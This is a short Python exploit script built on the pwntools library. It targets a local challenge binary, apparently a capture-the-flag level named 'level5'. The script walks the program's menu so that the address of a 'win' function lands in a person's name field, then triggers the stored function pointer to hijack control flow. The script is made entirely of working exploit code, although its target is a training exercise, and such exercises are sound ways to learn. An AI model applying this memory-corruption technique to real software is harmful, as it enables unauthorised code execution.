from pwn import *
log.level = 'DEBUG'

DEBUG = False

elf = ELF("./level5")
libc = elf.libc

if DEBUG:
    r = gdb.debug("./level5")
else:
    r = process("./level5")

def menu():
    r.recvuntil("exit?\n")

def create_func(name):
    menu()
    r.sendline("1")
    r.recvuntil("g?\n")
    r.sendline(name)
    r.recvuntil("se...\n")

def call_func():
    menu()
    r.sendline("2")
    r.recvuntil("OK\n")

def create_person():
    menu()
    r.sendline("3")

def name_person(first_name, last_name):
    menu()
    r.sendline("4")
    r.recvuntil("name:\n")
    r.sendline(first_name)
    r.recvuntil("name:\n")
    r.sendline(last_name)

def exit(should_exit : bool):
    menu()
    r.sendline("5")
    r.recvuntil("?:")
    if should_exit:
        r.sendline("y")
    else:
        r.sendline("n")
        r.recvline()


if DEBUG:
    log.info("press enter to start execution")
    raw_input()

create_func(cyclic(8))

exit(False)

create_person()

name_person(cyclic(8),p64(elf.sym.win))

call_func()

r.interactive()

